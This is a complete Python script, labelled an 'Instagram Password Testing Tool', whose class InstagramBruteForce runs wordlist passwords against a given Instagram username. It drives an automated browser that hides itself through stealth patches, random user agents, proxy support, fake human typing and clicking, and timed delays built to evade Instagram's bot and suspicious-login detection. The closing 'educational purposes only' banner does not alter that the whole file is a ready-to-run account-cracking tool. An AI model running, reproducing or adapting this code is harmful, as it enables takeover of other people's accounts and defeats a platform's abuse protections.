"""
Instagram Password Testing Tool
Version: 2.0
Author: Security Professional
Description: Advanced tool for testing password strength against Instagram accounts
"""

import time
import random
import json
import logging
from datetime import datetime
from typing import Optional, Tuple, List
import argparse
import sys
import os
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from fake_useragent import UserAgent
from selenium_stealth import stealth
import undetected_chromedriver as uc

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('instagram_tool.log'),
        logging.StreamHandler()
    ]
)

class InstagramBruteForce:
    def __init__(self, config: dict):
        """
        Initialize the Instagram password testing tool
        
        Args:
            config (dict): Configuration dictionary containing:
                - username: Instagram username to test
                - password_list: Path to password list file
                - headless: Run in headless mode (True/False)
                - max_attempts: Maximum number of attempts before delay
                - delay_range: Tuple of min/max delay between attempts
                - proxy: Optional proxy server (format: ip:port)
        """
        self.config = config
        self.driver = None
        self.session_stats = {
            'start_time': datetime.now(),
            'attempts': 0,
            'success': False,
            'tested_passwords': []
        }
        
    def setup_driver(self) -> webdriver.Chrome:
        """Configure and return a stealthy Chrome WebDriver instance"""
        try:
            chrome_options = uc.ChromeOptions()
            
            # Basic stealth settings
            chrome_options.add_argument("--disable-blink-features=AutomationControlled")
            chrome_options.add_argument("--disable-extensions")
            chrome_options.add_argument("--disable-popup-blocking")
            chrome_options.add_argument("--disable-infobars")
            chrome_options.add_argument("--disable-web-security")
            chrome_options.add_argument("--disable-xss-auditor")
            chrome_options.add_argument("--no-sandbox")
            
            if self.config.get('headless', False):
                chrome_options.add_argument("--headless=new")
            
            if self.config.get('proxy'):
                chrome_options.add_argument(f"--proxy-server={self.config['proxy']}")
            
            # Randomize user agent
            ua = UserAgent()
            user_agent = ua.random
            chrome_options.add_argument(f'--user-agent={user_agent}')
            
            # Configure window size randomly
            width = random.randint(1200, 1920)
            height = random.randint(800, 1080)
            chrome_options.add_argument(f"--window-size={width},{height}")
            
            # Initialize undetected Chrome driver
            driver = uc.Chrome(
                service=Service('chromedriver.exe'),
                options=chrome_options,
                use_subprocess=True
            )
            
            # Apply stealth configurations
            stealth(driver,
                    languages=["en-US", "en"],
                    vendor="Google Inc.",
                    platform="Win32",
                    webgl_vendor="Intel Inc.",
                    renderer="Intel Iris OpenGL Engine",
                    fix_hairline=True,
                    )
            
            # Randomize navigator properties
            driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            driver.execute_script("Object.defineProperty(navigator, 'plugins', {get: () => [1, 2, 3]})")
            driver.execute_script("Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']})")
            
            return driver
            
        except Exception as e:
            logging.error(f"Driver setup failed: {str(e)}")
            raise

    def human_type(self, element, text: str, delay_range: Tuple[float, float] = (0.05, 0.3)) -> None:
        """
        Simulate human-like typing with random delays and occasional mistakes
        
        Args:
            element: WebElement to type into
            text: Text to type
            delay_range: Min/max delay between keystrokes
        """
        try:
            # Sometimes focus the field first
            if random.random() > 0.7:
                element.click()
                time.sleep(random.uniform(0.2, 0.5))
            
            for i, char in enumerate(text):
                # Occasionally make a typo and correct it
                if random.random() > 0.95:
                    wrong_char = random.choice('abcdefghijklmnopqrstuvwxyz1234567890')
                    element.send_keys(wrong_char)
                    time.sleep(random.uniform(*delay_range))
                    element.send_keys(Keys.BACKSPACE)
                    time.sleep(random.uniform(*delay_range))
                
                element.send_keys(char)
                
                # Vary typing speed
                delay = random.uniform(*delay_range)
                
                # Occasionally pause longer between words
                if char == ' ' and random.random() > 0.8:
                    delay *= 2
                
                time.sleep(delay)
                
                # Sometimes move cursor randomly
                if random.random() > 0.9:
                    actions = ActionChains(self.driver)
                    if random.random() > 0.5:
                        actions.send_keys(Keys.ARROW_LEFT).perform()
                        time.sleep(random.uniform(0.1, 0.3))
                        actions.send_keys(Keys.ARROW_RIGHT).perform()
                    else:
                        actions.send_keys(Keys.ARROW_RIGHT).perform()
                        time.sleep(random.uniform(0.1, 0.3))
                        actions.send_keys(Keys.ARROW_LEFT).perform()
        
        except Exception as e:
            logging.error(f"Error during human typing: {str(e)}")
            raise

    def human_click(self, element) -> None:
        """Simulate human-like mouse movement and clicking"""
        try:
            actions = ActionChains(self.driver)
            
            # Move to element with slight offset
            x_offset = random.randint(-5, 5)
            y_offset = random.randint(-5, 5)
            
            # Vary movement speed
            actions.move_to_element_with_offset(element, x_offset, y_offset)
            
            # Sometimes pause before clicking
            if random.random() > 0.7:
                actions.pause(random.uniform(0.1, 0.5))
            
            # Click with slight delay
            actions.click().pause(random.uniform(0.1, 0.3)).perform()
            
        except Exception as e:
            logging.error(f"Error during human click: {str(e)}")
            raise

    def handle_cookies(self) -> bool:
        """Handle cookie consent popup if present"""
        try:
            cookie_btn = WebDriverWait(self.driver, 5).until(
                EC.element_to_be_clickable((By.XPATH, 
                    "//button[contains(., 'Allow essential and optional cookies') or "
                    "contains(., 'Accept all cookies') or "
                    "contains(., 'Allow all cookies')]"))
            )
            self.human_click(cookie_btn)
            time.sleep(random.uniform(1, 2))
            return True
        except:
            return False

    def handle_verification(self) -> bool:
        """Handle potential verification requests"""
        try:
            # Check for "Verify it's you" page
            verify_title = WebDriverWait(self.driver, 5).until(
                EC.presence_of_element_located((By.XPATH, 
                    "//h1[contains(., 'Verify it') or contains(., 'Confirm it')]"))
            )
            if verify_title:
                logging.warning("Verification required - stopping session")
                return False
        except:
            pass
        
        try:
            # Check for suspicious login attempt warning
            suspicious_attempt = WebDriverWait(self.driver, 5).until(
                EC.presence_of_element_located((By.XPATH, 
                    "//h2[contains(., 'suspicious login attempt') or "
                    "contains(., 'unusual activity')]"))
            )
            if suspicious_attempt:
                logging.warning("Suspicious activity detected - stopping session")
                return False
        except:
            pass
        
        return True

    def login_attempt(self, password: str) -> bool:
        """
        Attempt to login with given password
        
        Args:
            password: Password to test
            
        Returns:
            bool: True if login successful, False otherwise
        """
        try:
            # Navigate to Instagram login page
            self.driver.get("https://www.instagram.com/accounts/login/")
            time.sleep(random.uniform(3, 6))
            
            # Handle cookies if present
            self.handle_cookies()
            
            # Enter username
            username_field = WebDriverWait(self.driver, 10).until(
                EC.presence_of_element_located((By.NAME, "username"))
            )
            username_field.clear()
            self.human_type(username_field, self.config['username'])
            time.sleep(random.uniform(0.5, 1.5))
            
            # Enter password
            password_field = WebDriverWait(self.driver, 10).until(
                EC.presence_of_element_located((By.NAME, "password"))
            )
            password_field.clear()
            self.human_type(password_field, password)
            time.sleep(random.uniform(0.5, 1.5))
            
            # Click login button
            login_button = WebDriverWait(self.driver, 10).until(
                EC.element_to_be_clickable((By.XPATH, "//button[@type='submit']"))
            )
            self.human_click(login_button)
            time.sleep(random.uniform(5, 8))
            
            # Check for verification requests
            if not self.handle_verification():
                return False
            
            # Check for error message
            try:
                error_msg = WebDriverWait(self.driver, 5).until(
                    EC.presence_of_element_located((By.XPATH, 
                        "//p[contains(., 'incorrect password') or "
                        "contains(., 'wrong password') or "
                        "contains(@id, 'slfErrorAlert')]"))
                )
                if error_msg.is_displayed():
                    return False
            except:
                pass
            
            # Check if we're still on login page
            if "accounts/login" in self.driver.current_url:
                return False
                
            # Check for 2FA page
            if "two_factor" in self.driver.current_url:
                logging.info("Login successful but 2FA required")
                return True
                
            # Check for home page elements
            try:
                WebDriverWait(self.driver, 10).until(
                    EC.presence_of_element_located((By.XPATH, "//nav"))
                )
                return True
            except:
                return False
                
        except Exception as e:
            logging.error(f"Login attempt failed: {str(e)}")
            return False

    def random_delay(self) -> None:
        """Generate a random delay between actions"""
        base_delay = random.uniform(*self.config.get('delay_range', (30, 120)))
        
        # Add additional delay every N attempts
        if self.session_stats['attempts'] % 5 == 0:
            base_delay *= 1.5
        
        logging.info(f"Waiting {base_delay:.1f} seconds before next attempt...")
        time.sleep(base_delay)

    def save_session(self) -> None:
        """Save session data to JSON file"""
        session_data = {
            'username': self.config['username'],
            'start_time': self.session_stats['start_time'].isoformat(),
            'end_time': datetime.now().isoformat(),
            'total_attempts': self.session_stats['attempts'],
            'success': self.session_stats['success'],
            'tested_passwords': self.session_stats['tested_passwords']
        }
        
        filename = f"instagram_session_{self.session_stats['start_time'].strftime('%Y%m%d_%H%M%S')}.json"
        
        with open(filename, 'w') as f:
            json.dump(session_data, f, indent=2)
        
        logging.info(f"Session data saved to {filename}")

    def run(self) -> Optional[str]:
        """Run the password testing process"""
        try:
            self.driver = self.setup_driver()
            logging.info("Driver initialized successfully")
            
            # Load password list
            try:
                with open(self.config['password_list'], 'r', encoding='utf-8', errors='ignore') as f:
                    passwords = [p.strip() for p in f.readlines() if p.strip()]
                
                if not passwords:
                    logging.error("No passwords found in the wordlist file")
                    return None
                
                logging.info(f"Loaded {len(passwords)} passwords for testing")
                
            except Exception as e:
                logging.error(f"Failed to load password list: {str(e)}")
                return None
            
            # Test each password
            for i, password in enumerate(passwords):
                self.session_stats['attempts'] += 1
                self.session_stats['tested_passwords'].append({
                    'password': password,
                    'timestamp': datetime.now().isoformat(),
                    'success': False
                })
                
                logging.info(f"Attempt {i+1}/{len(passwords)}: Testing password '{password}'")
                
                if self.login_attempt(password):
                    self.session_stats['success'] = True
                    self.session_stats['tested_passwords'][-1]['success'] = True
                    logging.info(f"SUCCESS! Valid password found: {password}")
                    self.save_session()
                    return password
                
                logging.info(f"Password incorrect: {password}")
                
                # Take a break every few attempts
                if i > 0 and i % self.config.get('max_attempts', 3) == 0:
                    self.random_delay()
                else:
                    time.sleep(random.uniform(1, 3))
            
            logging.info("Password testing completed - no valid password found")
            self.save_session()
            return None
            
        except KeyboardInterrupt:
            logging.info("Process interrupted by user")
            self.save_session()
            return None
            
        except Exception as e:
            logging.error(f"Fatal error: {str(e)}")
            return None
            
        finally:
            if self.driver:
                self.driver.quit()

def load_config() -> dict:
    """Load configuration from command line arguments"""
    parser = argparse.ArgumentParser(
        description="Instagram Password Testing Tool",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    
    parser.add_argument('-u', '--username', required=True, help="Instagram username to test")
    parser.add_argument('-w', '--wordlist', required=True, help="Path to password wordlist file")
    parser.add_argument('--headless', action='store_true', help="Run browser in headless mode")
    parser.add_argument('--proxy', help="Proxy server (format: ip:port)")
    parser.add_argument('--max-attempts', type=int, default=3, 
                       help="Max attempts before longer delay")
    parser.add_argument('--min-delay', type=float, default=30.0,
                       help="Minimum delay between attempts")
    parser.add_argument('--max-delay', type=float, default=120.0,
                       help="Maximum delay between attempts")
    
    args = parser.parse_args()
    
    # Validate wordlist exists
    if not os.path.exists(args.wordlist):
        logging.error(f"Wordlist file not found: {args.wordlist}")
        sys.exit(1)
    
    return {
        'username': args.username,
        'password_list': args.wordlist,
        'headless': args.headless,
        'proxy': args.proxy,
        'max_attempts': args.max_attempts,
        'delay_range': (args.min_delay, args.max_delay)
    }

if __name__ == "__main__":
    print("""
    Instagram Password Testing Tool
    ------------------------------
    Note: This tool is for educational and security testing purposes only.
    Use only on accounts you own or have permission to test.
    """)
    
    config = load_config()
    tool = InstagramBruteForce(config)
    
    start_time = time.time()
    result = tool.run()
    elapsed = time.time() - start_time
    
    if result:
        print(f"\n[SUCCESS] Valid password found: {result}")
        print(f"Username: {config['username']}")
        print(f"Password: {result}")
    else:
        print("\n[FAILURE] No valid password found in the wordlist")
    
    print(f"\nTesting completed in {elapsed:.1f} seconds")
